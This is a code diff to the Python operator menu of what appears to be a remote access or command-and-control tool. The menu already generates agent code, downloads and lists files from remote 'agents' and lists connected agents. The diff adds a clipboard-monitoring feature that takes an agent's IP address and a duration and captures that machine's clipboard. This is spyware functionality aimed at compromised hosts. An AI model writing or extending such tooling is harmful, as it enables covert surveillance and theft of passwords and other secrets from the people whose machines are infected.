@@ -14,7 +14,7 @@ custom_theme = Theme({
 console = Console(theme=custom_theme)
 
 options_rows = ['Generate code for agent', 'Download file from agent', 'List agent\'s files from directory',
-                'List agents', 'Close agent connection', 'Exit']
+                'Monitor agent\'s clipboard', 'List agents', 'Close agent connection', 'Exit']
 
 
 def menu():
@@ -36,6 +36,8 @@ def menu():
     if value == '3':
         list_agent_files()
     if value == '4':
+        monitor_agent_clipboard()
+    if value == '5':
         list_agents()
     else:
         menu()
@@ -67,6 +69,17 @@ def list_agent_files():
     cybServerGateway.list_files_from_agent(cybServerGateway.ListFilesFromAgentInputType(
         ip_address=ip_address, dir_path=dir_path))
     menu()
+
+
+def monitor_agent_clipboard():
+    console.print("Insert agent's ip address", style="info")
+    ip_address = input('>')
+    console.print("Insert agent's clipboard monitor duration", style="info")
+    duration = input('>')
+    cybServerGateway.monitor_clipboard_on_agent(cybServerGateway.MonitorClipboardOnAgentInputType(
+        ip_address=ip_address, duration=duration))
+    menu()
+
 
 
 def list_agents():
